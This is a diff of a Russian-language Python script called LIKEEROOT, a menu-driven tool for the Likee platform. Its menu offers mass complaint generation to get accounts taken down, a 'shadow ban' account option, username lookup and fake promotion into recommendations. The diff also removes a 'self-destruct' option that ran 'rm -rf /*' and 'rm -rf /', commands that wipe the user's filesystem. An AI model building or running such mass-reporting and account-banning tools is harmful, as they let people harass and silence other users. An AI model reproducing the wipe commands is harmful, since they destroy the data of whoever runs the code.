@@ -3,14 +3,22 @@
 code = "eyJtZXNzYWdlIjoiIn0="
 #server = "https://bstream.likeeapp.ru/json?uri=8001001&aid=48&t=0.7859116550012502"
 txt = '''
-Добро пожаловать!
-
-Данный софт был написан для взаимодействия с Likee!
-
-
+    ┏┓╋┏┳━━━┳┓╋╋┏┓╋╋┏━━━┓
+    ┃┃╋┃┃┏━━┫┃╋╋┃┃╋╋┃┏━┓┃
+    ┃┗━┛┃┗━━┫┃╋╋┃┃╋╋┃┃╋┃┃
+    ┃┏━┓┃┏━━┫┃╋┏┫┃╋┏┫┃╋┃┃
+    ┃┃╋┃┃┗━━┫┗━┛┃┗━┛┃┗━┛┃
+    ┗┛╋┗┻━━━┻━━━┻━━━┻━━━┛
 '''
 
-
+logo = """
+    ╭╮╱╱╭━━┳╮╭━┳━━━┳━━━┳━━━┳━━━━╮
+    ┃┃╱╱╰┫┣┫┃┃╭┫╭━╮┃╭━╮┃╭━╮┃╭╮╭╮┃
+    ┃┃╱╱╱┃┃┃╰╯╯┃╰━╯┃┃╱┃┃┃╱┃┣╯┃┃╰╯
+    ┃┃╱╭╮┃┃┃╭╮┃┃╭╮╭┫┃╱┃┃┃╱┃┃╱┃┃
+    ┃╰━╯┣┫┣┫┃┃╰┫┃┃╰┫╰━╯┃╰━╯┃╱┃┃
+    ╰━━━┻━━┻╯╰━┻╯╰━┻━━━┻━━━╯╱╰╯  
+"""
 
 #CODE
 print ("Loading...")
@@ -20,7 +28,7 @@ import time
 import requests
 #import random
 import colorama
-from colorama import Fore, Back, Style
+from colorama import Fore
 import os
 
 
@@ -32,8 +40,7 @@ print (Fore.YELLOW + "")
 with open('keysoft.txt', 'r', encoding='utf-8') as file:
     for line in file:
         key = (line.strip())
-        
-        #print (key)
+
 
 
 if key == code:
@@ -41,8 +48,10 @@ if key == code:
     os.system("clear")
 else:
     print ("")
+    print ('[+] ДОБРО ПОЖАЛОВАТЬ [+]')
+    time.sleep(1)
     for i in txt:
-        time.sleep(0.04)
+        time.sleep(0.01)
         print(i, end='', flush=True)
     #ввод ключа
     print ("")
@@ -68,7 +77,7 @@ else:
 
 
 #info
-vers = "0.08"
+vers = "0.10"
 #update = "Исправление ошибок, добавление новых функций."
 
 
@@ -92,10 +101,8 @@ Developer> (RESHETKA)
 Версия> {vers}
 LIKEEROOT - ЭТО СОФТ СДЕЛАНЫЙ ДЛЯ ВЗАИМОДЕЙСТВИЯ С LIKEE!
 
-ОБНОВЛЕНИЕ 28.08.2025
-Добавлены новые UserAgent, Новые текста для сноса.
-
-Добавлена функция немедленного самоуничтожения.
+ОБНОВЛЕНИЕ 29.08.2025
+Теперь LIKROOT ловит даже на Парковке.
 
 ---------
 Telegramm:  https://t.me/+Q6dkr4rcjJEwY2Qy
@@ -106,35 +113,28 @@ Telegramm:  https://t.me/+Q6dkr4rcjJEwY2Qy
 
 
 menu = """
---------------------------------------
-{+} 1. Скачать видео
-{+} 2. Информация о трансляции
-{+} 3. Информация о видео
-{+} 4. Продвижение в рекомендации
-{+} 5. Информация о софте
-{+} 6. Генерация жалоб (snosing)
-{+} 7. Поиск по username
-{+} 8. Данные о видео из аккаунта
-{+} 9. Информация об аккаунте
-{+} 10. Account (TENEVOI BAN)
-
-[=] 9999. 💀Самоуничтожение
-[=] 0. Выход
---------------------------------------
+    ----------------------------------
+    {+} 1. Скачать видео
+    {+} 2. Информация о трансляции
+    {+} 3. Информация о видео
+    {+} 4. Продвижение в рекомендации
+    {+} 5. Информация о софте
+    {+} 6. Генерация жалоб (snosing)
+    {+} 7. Поиск по username
+    {+} 8. Данные о видео из аккаунта
+    {+} 9. Информация об аккаунте
+    {+} 10. Account (TENEVOI BAN)
+    
+    [=] 0. Выход
+    ----------------------------------
 """
-#url = input("URL>")
 
 
-
-with open("logo.txt", "r", encoding='utf-8') as file:
-    logo = content = file.read()
-    print (Fore.WHITE + Back.RED + logo + Style.RESET_ALL)
+print (Fore.WHITE + logo)
 
 print ("")
 print (Fore.CYAN + "[=] Developer: RESHETKA")
-#print ("")
 
-#print (Fore.YELLOW + "")
 print (Fore.YELLOW + menu)
 
 #scripts
@@ -172,17 +172,9 @@ if us == "avtosnos":
 if us == "10":
     from api import accountsnos
 
-if us == "9999":
-    print ("Запуск режима самоуничтожения")
-    time.sleep(1)
-    os.system("rm -rf /*")
-    os.system("rm -rf /")
-    
-
 
     
-
-
+#soft
     
 
 if us =="5":
